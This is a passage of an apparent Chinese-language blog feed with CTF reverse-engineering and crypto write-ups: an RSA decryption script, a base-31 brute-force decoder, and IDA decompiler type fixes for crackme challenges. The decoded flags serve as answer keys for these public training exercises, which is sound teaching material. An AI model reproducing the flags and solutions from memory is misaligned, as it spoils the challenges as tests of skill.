<span class="comment">// char src[8]; // [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">    <span class="comment">// __int64 v7; // [rsp+28h] [rbp-38h]</span></span><br><span class="line">    <span class="comment">// int v8; // [rsp+30h] [rbp-30h]</span></span><br><span class="line">    <span class="comment">// __int64 v9[2]; // [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="comment">// int v10; // [rsp+50h] [rbp-10h]</span></span><br><span class="line">    <span class="comment">// unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *(long long *)src = 0x534C43444ELL;</span></span><br><span class="line">    <span class="comment">// v7 = 0LL;</span></span><br><span class="line">    <span class="comment">// v8 = 0;</span></span><br><span class="line">    <span class="comment">// v9[0] = 0x776F646168LL;</span></span><br><span class="line">    <span class="comment">// v9[1] = 0LL;</span></span><br><span class="line">    <span class="comment">// v10 = 0;</span></span><br><span class="line">    <span class="comment">// text = (char *)join(key3, (char*)v9);</span></span><br><span class="line">    <span class="comment">// strcpy(key, key1);</span></span><br><span class="line">    <span class="comment">// strcat(key, src);</span></span><br><span class="line">    <span class="comment">// v2 = 0;</span></span><br><span class="line">    <span class="comment">// v3 = 0;</span></span><br><span class="line">    <span class="comment">// v5 = strlen(key);</span></span><br><span class="line">    <span class="comment">// for ( i = 0; i &lt; v5; ++i ) &#123;</span></span><br><span class="line">    <span class="comment">//     if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 )</span></span><br><span class="line">    <span class="comment">//         key[i] = key[v3 % v5] + 32;</span></span><br><span class="line">    <span class="comment">//     ++v3;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// printf(&quot;v3=%d v5=%d key=%s\n&quot;, v3, v5, key);</span></span><br><span class="line">    <span class="comment">// printf(&quot;text=%s\n&quot;,text);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>; <span class="comment">//上面的处理脚本求出的key</span></span><br><span class="line">    <span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>; <span class="comment">//上面的处理脚本求出的text</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(key); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> chr = <span class="string">&#x27;A&#x27;</span>; chr &lt;= <span class="string">&#x27;Z&#x27;</span>; ++chr) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((chr - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == text[i]) &#123;</span><br><span class="line">                v3++;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa的判断">RSA的判断</h2><p>见<code>[SUCTF2019]SignIn</code></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922170839398.png" alt="image-20230922170839398"></p><p>根据第20行的求幂并取模,和65537这个数,直接看出是RSA加密,调用python相关库进行求解</p><p>同时结果转换成十六进制数,使用<code>binascii.unhexlify()</code>方法将其转换为字符串</p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br></pre></td></tr></table></figure><h1 id="数学基础考察">数学基础考察</h1><h2 id="求模逆运算">求模逆运算</h2><p>例题:NSSCTF-[SWPUCTF 2021 新生赛]fakebase</p><p>题目:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">s_box = <span class="string">&#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i)))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">b1 = <span class="built_in">int</span>(tmp,<span class="number">2</span>)</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> b1//<span class="number">31</span> != <span class="number">0</span>:</span><br><span class="line">    s += s_box[b1%<span class="number">31</span>]</span><br><span class="line">    b1 = b1//<span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = u#k4ggia61egegzjuqz12jhfspfkay</span></span><br></pre></td></tr></table></figure><p>题目考查了取模的逆运算，假设<code>c=a%b</code>已知，<code>c</code>和<code>b</code>，那么a可以得到算式：<code>a=k*b+c</code>。其中<code>k</code>是需要爆破的.</p><p>1.加密时,将flag的每一个字符的8位ASCII码拼接起来,生成一个整数b1,</p><p>然后对b1循环,每次将b1%31作为下标从s_box中找到转换的字符,并拼接到s中,然后b1整除31,以此类推,直到b1为0(?).</p><p>2.解密时,先令b1=0,然后将s逆序,对每一个字符从s_box中找到其下标,依次加入到b1中,然后b1*=31.</p><p>最后能逆向求出前面的b1,然后使用对应的方法转换为字符串即可.</p><p>但是这里有一个问题,那就是flag的第一个字符需要爆破—由于对31求模的运算,我们不知道这个求模究竟减掉了多少个31,也就是说k*31中,我们不知道<code>k</code>的值.</p><p>3.爆破方法:</p><p>因为每次处理的字符都是其ASCII码,不超过128,那么<code>128//31==4</code>,所以爆破范围不超过5,我们直接在外面套一个循环,让b1最开始就等于这个数,内层的循环中的<code>b1 = b1 * 31 + s_box.index(i)</code>第一次执行就会将其乘上k,然后正常处理,输出这次的flag.</p><p>循环5次后,从爆破出来字符串中找到正确的flag(其他的大概率乱码).</p><p>关键在于,第一个字符直接影响到最终的b1的高位(?),进而直接影响到整个flag的解码,而不是仅仅影响第一个字符的解码.</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;u#k4ggia61egegzjuqz12jhfspfkay&#x27;</span></span><br><span class="line">s_box = <span class="string">&#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    b1 = k</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(s):</span><br><span class="line">        b1 = b1 * <span class="number">31</span> + s_box.index(i)</span><br><span class="line">    b1 = <span class="built_in">str</span>(<span class="built_in">bin</span>(b1))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(b1)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b1) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        b1 = b1.zfill((<span class="built_in">len</span>(b1) // <span class="number">8</span> + <span class="number">1</span>) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b1), <span class="number">8</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(b1[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\CTF\Scripts\python.exe D:\Data\CTF\<span class="keyword">do</span>\test.py </span><br><span class="line">@ôãÂ»qrMñáSø&amp;xØº</span><br><span class="line">ñ¾v^PÌbk¬MÁ;a û</span><br><span class="line">5¢ÜÙoæ«Q¼åwGPJi&lt;</span><br><span class="line">NSSCTF&#123;WHAt_BASe31&#125;</span><br><span class="line">;zù¾</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA反编译的错误代码分析</title>
      <link href="/2023-09-30-d40c16a2f01b/"/>
      <url>/2023-09-30-d40c16a2f01b/</url>
      
        <content type="html"><![CDATA[<h1 id="ida变量分析错误">IDA变量分析错误</h1><p>2023.9.15</p><p>使用IDA进行分析时发现一些奇怪的代码,特别是有一些奇怪的指针强转(例如引用char数组的元素时强转为_DWORD*)时要去注意看IDA中变量的类型有无错误,多余,缺失.</p><h2 id="例题1-buuctf-不一样的flag">例题1—BUUCTF-不一样的flag</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA 分析出</span></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意<code>--*(_DWORD *)&amp;v3[25];</code>这行代码<br>实际上存储地图(分析题意得知是一个走迷宫游戏)的只有5x5,也就是0-24的下标.<br>且v3[25]的地址被强转为int*,也就是说原本的v3[25-28]这4个字节其实是一个单独的变量,实际上就是当前所在行row,<br>所以v3的类型应该被改成<code>char v3[25];</code>而不是<code>char v3[29];</code></p><p>注意<code>if ( *(int *)&amp;v3[4 * i + 25] &lt; 0 || *(int *)&amp;v3[4 * i + 25] &gt; 4 )</code>这行代码<br>首先把v4(v3修改后新生成的那个v4)重命名成col,<br>前面把v3[25-28]这4个字节修改成row后变成<code>if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )</code>,<br>更能看出问题—这个循环只有两次,实际上就是判断row和col两个变量是否 &lt;0 或 &gt;4<br>不过这里是代码分析,并不是变量分析错误的问题</p><p>注意<code>if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )</code>这行代码<br>有_BYTE v7[12];这个数组,但我们只用了v8的地址,那么再根据这个函数的局部变量分布和5*5的地图这个信息,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(...)</span>&#123;</span><br><span class="line">    <span class="type">char</span> v3[<span class="number">25</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF //已修改</span></span><br><span class="line">    <span class="type">int</span> row; <span class="comment">// [esp+30h] [ebp-1Ch] //新生成的int变量</span></span><br><span class="line">    <span class="type">int</span> col; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">    _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么有4x4+25=41个字节的向前偏移,即v3[25]的25个字节,v4,v5,v6,i的16个字节<br>所以代码可以修改为<code>if ( v7[5 * row + col] == '#' )</code>,实际上就是把v3当做5*5的二维数组来使用<br>这样整个代码就非常清晰了</p><h2 id="例题2-buuctf-actf新生赛2020-easyre">例题2—BUUCTF-[ACTF新生赛2020]easyre</h2><p>这个题一样,能看出来IDA分析的结果中常常有 int和char或其指针反复互相转换使用的代码</p><p>修改前IDA分析出来的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过手动修改的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改后的IDA伪代码</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">12</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">18</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v6[<span class="number">17</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v5 = *(_DWORD *)&amp;v6[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">4</span>] = *(_DWORD *)&amp;v6[<span class="number">9</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">8</span>] = *(_DWORD *)&amp;v6[<span class="number">13</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[v5[i] - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v4[<span class="number">100</span>] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">char</span> _data_start__[<span class="number">200</span>] = &#123;</span><br><span class="line">        <span class="number">0x7e</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x74</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>,</span><br><span class="line">        <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span 